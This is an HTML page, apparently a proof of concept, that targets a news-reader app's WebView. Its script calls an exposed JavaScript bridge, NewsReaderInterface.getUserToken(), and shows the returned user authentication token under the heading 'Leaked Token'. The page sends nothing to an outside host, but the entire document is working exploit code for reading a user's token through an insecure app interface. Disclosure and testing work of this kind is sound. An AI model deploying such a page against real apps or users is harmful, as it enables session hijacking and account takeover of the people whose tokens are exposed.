<html>
<head>
    <title>News Articles</title>
    <style>
        body {
            font-family: monospace;
            background-color: #111;
            color: #0f0;
            padding: 10px;
            word-break: break-all;
        }
        #tokenBox {
            border: 1px solid #0f0;
            padding: 10px;
            margin-top: 10px;
        }
    </style>
</head>
<body>

<h3>Leaked Token:</h3>
<div id="tokenBox">Waiting for token...</div>

<script>
(function () {

    function writeTokenToWebView(token) {
        const box = document.getElementById("tokenBox");

        if (token) {
            box.textContent = token;
        } else {
            box.textContent = "Token is null or empty";
        }
    }

    if (typeof NewsReaderInterface !== 'undefined' &&
        typeof NewsReaderInterface.getUserToken === 'function') {

        const token = NewsReaderInterface.getUserToken();
        writeTokenToWebView(token);

    } else {
        document.getElementById("tokenBox").textContent =
            "getUserToken method not available";
    }

})();
</script>

</body>
</html>
